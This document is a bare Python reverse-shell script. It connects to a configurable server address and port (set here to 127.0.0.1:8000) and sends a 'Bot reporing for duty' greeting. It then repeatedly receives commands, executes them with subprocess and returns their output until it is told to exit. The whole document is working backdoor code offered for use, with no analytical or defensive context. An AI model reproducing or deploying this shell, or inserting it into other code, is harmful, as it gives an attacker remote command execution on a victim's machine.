# Python3 Reverse Shell

#!/bin/python

import sys
from subprocess import Popen, PIPE
from socket import *

serverName = '127.0.0.1'
serverPort = 8000  # or any port you want to listen on

# Creating the IPv4 and TCP Socket
clientSocket = socket(AF_INET, SOCK_STREAM)
# Connecting to Server
clientSocket.connect((serverName, serverPort))
# Sending String as bytes
clientSocket.send('Bot reporing for duty'.encode())
# Decoding string from bytes
command = clientSocket.recv(1024).decode()

# while loop
while command != "exit":
    proc = Popen(command.split(" "), stdout= PIPE, stderr= PIPE)
    result, err = proc.communicate()
    clientSocket.send(result)
    command = (clientSocket.recv(4064)).decode()

clientSocket.close()